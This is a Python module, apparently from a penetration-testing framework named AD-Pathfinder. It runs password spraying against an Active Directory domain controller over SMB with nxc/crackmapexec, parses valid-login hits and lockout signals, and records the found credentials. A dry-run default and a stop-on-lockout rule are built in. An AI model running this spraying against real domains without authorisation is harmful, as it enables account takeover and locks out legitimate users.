"""
password_spray_module.py - Password Spraying module for AD-Pathfinder.

Performs controlled password spraying against a DC using nxc/crackmapexec.
Lockout-aware — operator MUST review and confirm before any spray executes.

Attack chain:
    1. Verify user list exists (state.users or users-rid.txt file)
    2. Operator supplies password(s) to spray
    3. Display lockout warning + confirmation gate
    4. Run: nxc smb target -u <usersfile> -p <password> --continue-on-success
    5. Parse [+] hits from output
    6. Update state.valid_credentials
    7. Log findings

Tools used:
    - nxc / crackmapexec / cme
"""

from __future__ import annotations

import os
import re
import sys
import tempfile
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

REPORTS_DIR = "reports"

# ─────────────────────────────────────────────────────────────────────────────
# Parsers
# ─────────────────────────────────────────────────────────────────────────────

# nxc success line:  SMB  192.168.11.116  445  DC01  [+] DOMAIN\user:password
SUCCESS_RE = re.compile(
    r"\[\+\]\s+\S+\\(\S+):(.+)",
    re.IGNORECASE,
)

# Locked-out indicator in nxc output
LOCKED_RE = re.compile(r"account.*lock|STATUS_ACCOUNT_LOCKED", re.IGNORECASE)


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def _detect_nxc(executor: CommandExecutor) -> Optional[str]:
    for binary in ("nxc", "crackmapexec", "cme", "netexec"):
        if executor.check_tool(binary):
            return binary
    return None


def _write_userfile(users: list[str], path: str) -> None:
    with open(path, "w", encoding="utf-8") as fh:
        fh.write("\n".join(users) + "\n")


def _parse_spray_output(output: str) -> tuple[list[dict], bool]:
    """
    Parse nxc spray output for valid credentials and lockout indicators.

    Returns
    -------
    tuple[list[dict], bool]
        (valid_creds, lockout_detected)
        valid_creds: [{username, password}]
    """
    valid_creds:      list[dict] = []
    lockout_detected: bool = False

    for line in output.splitlines():
        # Check for lockouts first
        if LOCKED_RE.search(line):
            lockout_detected = True

        # Parse successful logins
        m = SUCCESS_RE.search(line)
        if m:
            username = m.group(1).strip()
            password = m.group(2).strip()

            # Skip Guest-level hits — nxc marks these with (Guest) at the end.
            # They mean the password was wrong but the DC allowed guest access.
            if "(Guest)" in password or "(Guest)" in line.split(
                f"{username}:"
            )[-1]:
                continue

            # Skip AD group names — they contain spaces and are not real accounts
            if " " in username:
                continue

            valid_creds.append({"username": username, "password": password})

    return valid_creds, lockout_detected


def _save_user_file(users: list[str], assessment_id: str) -> str:
    """Save users to generated/users-all.txt for operator use."""
    from modules.file_export import save_all_users
    return save_all_users(users)


# ─────────────────────────────────────────────────────────────────────────────
# PasswordSprayModule
# ─────────────────────────────────────────────────────────────────────────────

class PasswordSprayModule:
    """
    Controlled password spraying against SMB using nxc.

    IMPORTANT: This module does NOT automatically run the spray.
    It requires:
        1. A user list in state.users (populated by SMB RID brute or LDAP enum)
        2. A password list supplied by the operator (via run() parameters)
        3. The caller must pass confirmed=True to execute

    If confirmed=False (default), the module returns a dry-run preview only.

    Parameters
    ----------
    executor : CommandExecutor | None
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False, default_timeout=300)

    # ------------------------------------------------------------------ #
    #  Public API                                                          #
    # ------------------------------------------------------------------ #

    def run(
        self,
        state:     AssessmentState,
        passwords: list[str],
        confirmed: bool = False,
    ) -> dict:
        """
        Execute password spraying.

        Parameters
        ----------
        state : AssessmentState
        passwords : list[str]
            Passwords to spray.  Each password runs one spray round.
        confirmed : bool
            Must be True to actually execute.  False returns a dry-run preview.

        Returns
        -------
        dict
            {
                "status":          "success" | "dry_run" | "error",
                "valid_creds":     list[dict],   # {username, password}
                "lockout_detected": bool,
                "spray_rounds":    int,
                "user_count":      int,
                "user_file":       str,           # path to saved user list
                "warnings":        list[str],
                "error":           str | None,
            }
        """
        nxc_bin = _detect_nxc(self.executor)
        if not nxc_bin:
            return self._error("nxc/crackmapexec not found. Run: sudo apt install netexec")

        if not state.users:
            # Try loading from disk — generated/ might have users from a previous run
            from modules.file_export import load_users_into_state
            loaded = load_users_into_state(state)
            if not loaded:
                return self._error(
                    "No user list available. Run SMB RID brute force or LDAP enumeration first "
                    "(generates generated/users-all.txt automatically)."
                )

        if not passwords:
            return self._error("No passwords provided. Supply at least one password to spray.")

        target    = state.target_ip
        domain    = state.domain
        warnings: list[str] = []

        # ── Save user list to file ──────────────────────────────────────
        user_file = _save_user_file(state.users, state.assessment_id)

        # ── Dry run / preview ─────────────────────────────────────────
        if not confirmed:
            return {
                "status":           "dry_run",
                "valid_creds":      [],
                "lockout_detected": False,
                "spray_rounds":     len(passwords),
                "user_count":       len(state.users),
                "user_file":        user_file,
                "warnings": [
                    f"DRY RUN — {len(state.users)} users × {len(passwords)} password(s). "
                    "Confirm to execute.",
                    "WARNING: Password spraying can trigger account lockouts. "
                    "Know the domain lockout policy before proceeding.",
                    f"Command that will run:\n"
                    f"  {nxc_bin} smb {target} -u {user_file} "
                    f"-p '{passwords[0]}' --continue-on-success",
                ],
                "error":            None,
            }

        # ── Execute spray rounds ────────────────────────────────────────
        all_valid:        list[dict] = []
        lockout_detected: bool = False

        for password in passwords:
            command = [
                nxc_bin, "smb", target,
                "-u", user_file,
                "-p", password,
                "--continue-on-success",
            ]

            result   = self.executor.run(command)
            combined = result["output"] + "\n" + result["error"]

            found, locked = _parse_spray_output(combined)
            all_valid.extend(found)

            if locked:
                lockout_detected = True
                warnings.append(
                    f"⚠  LOCKOUT DETECTED during spray with password '{password}'. "
                    "Stopping immediately."
                )
                break  # stop on lockout

        # ── Update state ────────────────────────────────────────────────
        existing = {(c.get("username"), c.get("password")) for c in state.valid_credentials}
        for cred in all_valid:
            key = (cred["username"], cred["password"])
            if key not in existing:
                state.valid_credentials.append(cred)
                existing.add(key)
                state.log_finding(
                    category="Password Spray",
                    description=(
                        f"Valid credentials found: {cred['username']}:{cred['password']} "
                        f"(domain: {domain})"
                    ),
                    severity="CRITICAL",
                )

        if lockout_detected:
            state.log_finding(
                category="Password Spray",
                description="Account lockout detected during spray. Spray stopped.",
                severity="HIGH",
            )

        state.log_action(
            f"Password spray — {len(passwords)} password(s), "
            f"{len(state.users)} users, {len(all_valid)} hit(s)"
        )

        return {
            "status":           "success",
            "valid_creds":      all_valid,
            "lockout_detected": lockout_detected,
            "spray_rounds":     len(passwords),
            "user_count":       len(state.users),
            "user_file":        user_file,
            "warnings":         warnings,
            "error":            None,
        }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":           "error",
            "valid_creds":      [],
            "lockout_detected": False,
            "spray_rounds":     0,
            "user_count":       0,
            "user_file":        "",
            "warnings":         [],
            "error":            message,
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(
    state:     AssessmentState,
    passwords: Optional[list[str]] = None,
    confirmed: bool = False,
    executor:  Optional[CommandExecutor] = None,
) -> dict:
    """
    from modules.password_spray_module import run as spray_run
    result = spray_run(state, passwords=["Password123!"], confirmed=True)
    """
    return PasswordSprayModule(executor=executor).run(
        state,
        passwords=passwords or [],
        confirmed=confirmed,
    )


# ─────────────────────────────────────────────────────────────────────────────
# Smoke-test
# Usage: python modules/password_spray_module.py <target_ip> <domain> <password>
# ─────────────────────────────────────────────────────────────────────────────

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python modules/password_spray_module.py <target_ip> <domain> <password>")
        sys.exit(1)

    from session import AssessmentState, generate_assessment_id

    test_state = AssessmentState(
        assessment_id=generate_assessment_id(),
        target_ip=sys.argv[1],
        domain=sys.argv[2],
        open_ports=[445],
        users=["testuser1", "testuser2", "administrator"],
    )

    module = PasswordSprayModule(executor=CommandExecutor(verbose=True))

    # First: dry run preview
    preview = module.run(test_state, passwords=[sys.argv[3]], confirmed=False)
    print("\n--- DRY RUN ---")
    for w in preview["warnings"]:
        print(f"  {w}")

    # Uncomment to actually execute:
    # result = module.run(test_state, passwords=[sys.argv[3]], confirmed=True)
    # print(f"\n  Valid creds found: {result['valid_creds']}")
